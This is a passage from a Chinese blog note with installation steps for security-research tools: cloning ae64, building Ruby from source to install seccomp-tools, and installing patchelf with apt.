<p>下载下面的包后按照md文档安装即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/veritas501/ae64.git</span><br></pre></td></tr></table></figure>

<p>如果报错：找不到importlib_resources模块</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install importlib_resources</span><br></pre></td></tr></table></figure>

<p>然后再重新安装</p>
<h3 id="seccomp-tools"><a href="#seccomp-tools" class="headerlink" title="seccomp-tools"></a>seccomp-tools</h3><p>分析沙盒的工具，ubuntu自带的ruby安装老是报错，可能是因为版本太低，所以我先删除了ubuntu自带的ruby，然后从[ruby官网](<a href="https://www.ruby-lang.org/en/downloads/">Download Ruby (ruby-lang.org)</a>)上下载源码自行编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -zxvf ruby-3.0.0.tar</span><br><span class="line"><span class="built_in">cd</span> ruby-3.0.0</span><br><span class="line">sudo ./configure</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<p>编译完成后安装seccomp-tools</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo gem install seccomp-tools</span><br></pre></td></tr></table></figure>

<h3 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h3><p>用于修改程序动态链接库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install patchelf</span><br></pre></td></tr></table></figure>

<p>本文持续更新中……</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
</search>
